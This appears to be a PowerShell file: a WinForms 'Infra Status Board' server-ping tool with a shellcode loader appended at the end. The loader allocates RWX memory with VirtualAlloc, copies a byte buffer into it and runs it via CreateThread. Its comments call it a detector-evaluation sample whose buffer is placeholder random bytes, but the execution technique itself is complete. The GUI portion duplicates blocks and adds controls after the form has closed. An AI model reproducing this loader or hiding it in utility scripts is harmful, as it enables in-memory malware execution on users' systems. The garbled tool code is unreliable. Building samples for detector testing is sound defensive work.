Set-StrictMode -Version 2.0

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Infra Status Board'
$form.Size = New-Object System.Drawing.Size(780, 480)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('srv02', 'dc01', 'web-stg-01', 'app-prod-01', 'dc02')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Infra Status Board'
$form.Size = New-Object System.Drawing.Size(780, 480)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('srv02', 'dc01', 'web-stg-01', 'app-prod-01', 'dc02')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)
$button = New-Object System.Windows.Forms.Button
$button.Text = "Refresh"
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)
$grid = New-Object System.Windows.Forms.DataGridView
$grid.Location = New-Object System.Drawing.Point(18, 96)
$grid.Size = New-Object System.Drawing.Size(700, 300)
$grid.ReadOnly = $true
$grid.AllowUserToAddRows = $false
$grid.AutoSizeColumnsMode = 'Fill'
$form.Controls.Add($grid)

$table = New-Object System.Data.DataTable
[void]$table.Columns.Add('Server')
[void]$table.Columns.Add('Status')
[void]$table.Columns.Add('CheckedAt')
foreach ($server in $script:servers) {
    [void]$table.Rows.Add($server, 'Unknown', (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))
}
$grid.DataSource = $table

$saveButton = New-Object System.Windows.Forms.Button
$saveButton.Text = 'Export CSV'
$saveButton.Location = New-Object System.Drawing.Point(18, 410)
$saveButton.Size = New-Object System.Drawing.Size(120, 28)
$saveButton.Add_Click({
    $dialog = New-Object System.Windows.Forms.SaveFileDialog
    $dialog.Filter = 'CSV files (*.csv)|*.csv'
    $dialog.FileName = "agent-state.csv"
    if ($dialog.ShowDialog() -eq 'OK') {
        $table | Export-Csv -Path $dialog.FileName -NoTypeInformation -Encoding UTF8
        $statusLabel.Text = 'Exported'
    }
})
$form.Controls.Add($saveButton)

$menu = New-Object System.Windows.Forms.MenuStrip
$fileMenu = New-Object System.Windows.Forms.ToolStripMenuItem
$fileMenu.Text = 'File'
$exitItem = New-Object System.Windows.Forms.ToolStripMenuItem
$exitItem.Text = 'Exit'
$exitItem.Add_Click({ $form.Close() })
[void]$fileMenu.DropDownItems.Add($exitItem)
[void]$menu.Items.Add($fileMenu)
$form.Controls.Add($menu)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 120000
$timer.Add_Tick({
    $statusLabel.Text = 'Last refresh: ' + (Get-Date).ToString('HH:mm:ss')
})
$timer.Start()

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
Write-Host ("Console closed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor DarkGray

$toolTip = New-Object System.Windows.Forms.ToolTip
$toolTip.SetToolTip($textBox, 'Enter a short host name such as srv01.')
$toolTip.SetToolTip($button, 'Runs the connectivity check.')

$aboutItem = New-Object System.Windows.Forms.ToolStripMenuItem
$aboutItem.Text = 'About'
$aboutItem.Add_Click({
    [System.Windows.Forms.MessageBox]::Show('Contoso operations helper', 'About')
})

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(18, 410)
$progress.Size = New-Object System.Drawing.Size(660, 18)
$form.Controls.Add($progress)

$contextMenu = New-Object System.Windows.Forms.ContextMenuStrip
$copyItem = New-Object System.Windows.Forms.ToolStripMenuItem
$copyItem.Text = 'Copy'
[void]$contextMenu.Items.Add($copyItem)
$listBox.ContextMenuStrip = $contextMenu
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x21, 0x19, 0xdd, 0x43, 0x93, 0xd0, 0x51, 0x35, 0x59, 0xec, 0x97, 0xf7, 0xb3, 0xa5, 0xa9, 0xab,
    0xd5, 0x61, 0xbf, 0x26, 0x91, 0x9d, 0x65, 0xb6, 0xdb, 0xc5, 0x8a, 0x99, 0x7d, 0xc5, 0x52, 0xdc,
    0x5b, 0xa6, 0x1d, 0x70, 0xbe, 0x04, 0x44, 0xe4, 0x38, 0xd4, 0xe3, 0x78, 0x47, 0x81, 0xd1, 0x9d,
    0x29, 0x7f, 0x0d, 0x27, 0x5b, 0x12, 0xe7, 0x99, 0x0b, 0xbc, 0x0d, 0x07, 0x10, 0xe3, 0x0e, 0x36,
    0x5e, 0x31, 0x48, 0x92, 0x6a, 0x3a, 0x98, 0x68, 0xf5, 0x77, 0x3d, 0xad, 0x0d, 0x63, 0x41, 0xd6,
    0x4c, 0x23, 0xed, 0xe4, 0x9f, 0x7e, 0x23, 0x29, 0x49, 0x47, 0x20, 0xe3, 0xf9, 0xd2, 0xfd, 0x43,
    0xfc, 0x51, 0x06, 0x7d, 0x4f, 0xf7, 0xe2, 0x6d, 0x1b, 0x5f, 0x8f, 0x1b, 0xf9, 0xb5, 0xe2, 0xed,
    0x15, 0x21, 0x54, 0x4c, 0x76, 0xd2, 0xb7, 0xd3, 0x8d, 0x1c, 0xd9, 0x6a, 0xc8, 0x3c, 0x25, 0x4c,
    0x76, 0x14, 0x93, 0xf2, 0xb9, 0x41, 0xca, 0x7d, 0x67, 0x94, 0xa7, 0x13, 0x3c, 0xb5, 0x3b, 0xeb,
    0x71, 0x0c, 0x7b, 0xcd, 0xb6, 0x0b, 0x30, 0xa9, 0x01, 0x95, 0xf0, 0xeb, 0xe8, 0x25, 0xae, 0xa3,
    0x80, 0x80, 0xef, 0x08, 0xe9, 0xef, 0x90, 0x1f, 0x0e, 0x16, 0x14, 0x74, 0xc5, 0xeb, 0x1f, 0x74,
    0x9e, 0x0c, 0x9d, 0x93, 0x69, 0x1c, 0xbf, 0xee, 0xa8, 0x26, 0xad, 0xf7, 0x1f, 0x08, 0x4e, 0x31,
    0xca, 0xc6, 0x3a, 0x8e, 0x51, 0x9a, 0xad, 0x3a, 0x57, 0x9f, 0x9c, 0xc6, 0xd3, 0xd4, 0x99, 0x28,
    0x8b, 0x2c, 0x62, 0xe6, 0xea, 0xe3, 0xed, 0x9a, 0xbe, 0x62, 0x0b, 0x99, 0xe4, 0xcf, 0x4a, 0x66,
    0x1b, 0x2d, 0x14, 0x23, 0x2a, 0xb6, 0xa9, 0x52, 0x1e, 0x84, 0x0e, 0x75, 0x0c, 0x7f, 0x8a, 0xca,
    0xcc, 0x3c, 0xce, 0xa6, 0x41, 0xd2, 0xee, 0xb7, 0x11, 0x87, 0x6f, 0xcf, 0x80, 0x29, 0xbb, 0x94,
    0xae, 0x3c, 0x96, 0x6c, 0xea, 0xd7, 0xb7, 0x33, 0x5b, 0x78, 0x6c, 0x93, 0x84, 0x96, 0x57, 0xcb,
    0xcf, 0x66, 0x55, 0x80, 0xd8, 0x01, 0xfb, 0x5b, 0xc4, 0xff, 0xc4, 0xa1, 0xcc, 0x67, 0x89, 0xc0,
    0x77, 0x9b, 0x76, 0x4f, 0x28, 0xc1, 0xf3, 0x9c, 0x1f, 0xcd, 0x71, 0x69, 0x14, 0x39, 0x47, 0x13,
    0xf9, 0x6b, 0x5c, 0xb3, 0x42, 0x99, 0xbb, 0x12, 0x1f, 0x88, 0x34, 0x24, 0x76, 0x40, 0x64, 0x5b,
    0xc4, 0x68, 0xf5, 0xfa, 0x89, 0xbd, 0x07, 0x5b, 0x38, 0x60, 0x51, 0xfb, 0x68, 0x87, 0x44, 0x1d,
    0x18, 0xa3, 0x6d, 0xc6, 0xeb, 0x97, 0xae, 0x02, 0x82, 0x32, 0x6e, 0x7b, 0x1b, 0x0d, 0x2a, 0xe7,
    0x21, 0x44, 0xcb, 0x03, 0x4c, 0x88, 0x78, 0x85, 0x3a, 0x60, 0xc9, 0x8f, 0xf9, 0xd7, 0xda, 0x56,
    0x60, 0x93, 0x10, 0x92, 0x28, 0xe9, 0x10, 0xc0, 0x3a, 0x94, 0xde, 0x9a, 0xd1, 0x16, 0x0a, 0xef,
    0x38, 0xa5, 0xa5, 0x29, 0x3c, 0x25, 0xb9, 0x5a, 0x75, 0x19, 0x66, 0xa5, 0x09, 0x21, 0xe9
)

$Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 2125)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
